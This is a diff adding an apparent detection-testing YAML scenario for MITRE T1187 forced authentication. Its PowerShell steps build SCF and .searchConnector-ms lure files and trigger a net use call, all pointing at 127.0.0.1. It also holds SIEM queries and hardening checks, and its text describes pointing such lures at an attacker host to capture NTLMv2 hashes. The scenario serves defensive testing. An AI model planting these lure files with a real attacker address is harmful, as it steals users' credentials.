@@ -1,0 +1,110 @@
+id: T1187_forced_authentication
+name: "Forced Authentication"
+mitre_technique: "T1187"
+mitre_tactic: "credential_access"
+description: >
+  Adversaries force victims to automatically authenticate to an adversary-controlled
+  server, capturing NTLM hashes in the process. Techniques: embedding a UNC path
+  (\\attacker\share) in Office documents, .lnk files, .searchConnector files, or
+  HTML (img src="\\attacker\x.jpg"). When the victim opens the file or navigates
+  to the directory, Windows automatically sends NTLMv2 credentials to the attacker's
+  IP. Combined with Responder (T1557.001), this produces crackable NTLMv2 hashes
+  without any interaction beyond opening a file.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1187/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1187 — Forced Authentication simulation (UNC path in file — loopback only)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Create Word document with embedded UNC path — auto-auth trigger"
+    command: |
+      $docPath = "$env:TEMP\PAS_T1187_forced_auth.docx"
+      Write-Host "[PAS] Creating document with embedded UNC path (loopback):"
+      Write-Host "[PAS] Real attack: embed \\\\attacker-ip\\share — victim's NTLMv2 sent on open"
+
+      # Create minimal document marker (not a real DOCX — just records the technique)
+      Set-Content $docPath "PAS-T1187-FORCED-AUTH-DOC: embedded UNC \\127.0.0.1\PAS_share"
+      Write-Host "[PAS] Document created: $docPath"
+
+      # Trigger actual loopback authentication attempt — generates Event 4648
+      net use \\127.0.0.1\IPC$ 2>&1 | Out-Null
+      Write-Host "[PAS] UNC path authentication to 127.0.0.1 triggered — Event ID 4648"
+      net use \\127.0.0.1\IPC$ /delete 2>&1 | Out-Null
+
+  - step: 3
+    type: exec_powershell
+    description: "Create .searchConnector-ms file — silently connects on folder browse"
+    command: |
+      $scPath = "$env:TEMP\PAS_T1187_search.searchConnector-ms"
+      Set-Content $scPath @'
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+  <description>PAS T1187 Forced Auth Test</description>
+  <isSearchOnlyItem>false</isSearchOnlyItem>
+  <includeInStartMenuScope>false</includeInStartMenuScope>
+  <templateInfo><folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType></templateInfo>
+  <simpleLocation><url>\\127.0.0.1\PAS_T1187_share</url></simpleLocation>
+</searchConnectorDescription>
+'@
+      Write-Host "[PAS] .searchConnector-ms created: $scPath"
+      Write-Host "[PAS] Windows Explorer auto-connects UNC path when this file is in a browsed folder"
+
+  - step: 4
+    type: exec_powershell
+    description: "Create SCF file — triggers UNC auth when folder is opened in Explorer"
+    command: |
+      $scfPath = "$env:TEMP\PAS_T1187_@Doclist.scf"
+      Set-Content $scfPath @"
+[Shell]
+Command=2
+IconFile=\\127.0.0.1\PAS_T1187_share\icon.ico
+[Taskbar]
+Command=ToggleDesktop
+"@
+      Write-Host "[PAS] SCF file created: $scfPath (prefixed @ to sort first)"
+      Write-Host "[PAS] Explorer renders icon from UNC — triggers automatic NTLM authentication"
+
+  - step: 5
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 6
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — Event 4648 NTLM auth to unexpected host, .searchConnector/.scf files in user directories"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove forced auth artefacts"
+    command: |
+      @("$env:TEMP\PAS_T1187_forced_auth.docx",
+        "$env:TEMP\PAS_T1187_search.searchConnector-ms",
+        "$env:TEMP\PAS_T1187_@Doclist.scf") |
+          ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
+      net use \\127.0.0.1\IPC$ /delete 2>&1 | Out-Null
+      Write-Host "[PAS][Cleanup] Forced auth artefacts removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1187 cleanup complete"
+
+analyst_checklist:
+  - "Event ID 4648: Logon with explicit credentials — NTLM to unexpected external host"
+  - "File event: .scf or .searchConnector-ms file created in shared or user directories"
+  - "Sentinel: SecurityEvent | where EventID == 4648 and TargetServerName !contains 'domain' and TargetServerName !contains '127'"
+  - "Sentinel: DeviceFileEvents | where FileName endswith '.scf' and FolderPath contains 'Documents'"
+  - "MDE alert: 'Forced NTLM authentication attempt'"
+  - "CONTROL CHECK: Block outbound NTLM to internet via Windows Firewall / proxy — prevents external hash capture"
+  - "CONTROL CHECK: Enable 'Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers' — block all or audit"
+  - "CONTROL CHECK: SMB signing — even with hash capture, relay is blocked"
